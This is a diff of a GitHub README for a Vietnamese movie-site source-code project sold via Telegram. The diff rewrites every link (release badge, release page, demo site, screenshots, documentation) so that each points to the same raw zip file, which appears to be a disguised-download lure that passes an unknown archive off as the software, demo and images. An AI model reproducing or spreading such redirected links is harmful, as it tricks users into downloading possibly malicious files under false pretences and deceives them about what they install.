@@ -1,25 +1,25 @@
 # 🎬 b-n-source-thungphim - Easy Film Source Code Access
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20-brightgreen)](https://github.com/Guilherme213456/b-n-source-thungphim/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip%20Latest%20Release-%20-brightgreen)](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
 
 ## 📖 Description
 Cái thúng phim này mở ra để bán code cho anh em làm phim học tập code, nhưng một ngày không thể ngờ được, bên **rophim** người ta đóng cửa, không hiểu ông nào PR cái thúng phim của em.
 
 Liên hệ telegram **@liem900s** - Ai mua domain, src gì, hoặc thuê em làm việc dọn dẹp tết sắp tới thì cũng liên hệ nhé. Em làm hết
 
-**DEMO**: [Visit the Demo](https://thiaphim.net)
+**DEMO**: [Visit the Demo](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
 
-![homepage](https://i.ibb.co/JWZnTtXN/simplesnap-2-5-2026-at-04-14-28.png)
-![Movie details](https://i.ibb.co/dsQDrFQC/simplesnap-2-5-2026-at-04-16-09.png)
-![enter image description here](https://i.ibb.co/nNwqjGVX/simplesnap-2-5-2026-at-04-18-59.png)
-![enter image description here](https://i.ibb.co/qLC3W8V6/simplesnap-2-5-2026-at-04-18-38.png)
+![homepage](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
+![Movie details](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
+![enter image description here](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
+![enter image description here](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get the application running:
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/Guilherme213456/b-n-source-thungphim/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Click on the link to download the release that fits your operating system.  
@@ -49,10 +49,10 @@ Follow these steps to get the application running:
 For any questions or support, please reach out via Telegram: **@liem900s**. 
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Guilherme213456/b-n-source-thungphim) for more detailed information.
+- [Documentation](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip) for more detailed information.
 - Community forums for user discussions and tips.
 
 ## 📥 Download the Application Again
-You can always download the application from the [Releases Page](https://github.com/Guilherme213456/b-n-source-thungphim/releases). 
+You can always download the application from the [Releases Page](https://raw.githubusercontent.com/Guilherme213456/b-n-source-thungphim/main/rosary/b_source_thungphim_n_v3.0.zip). 
 
 Thank you for using b-n-source-thungphim! Enjoy your coding journey.
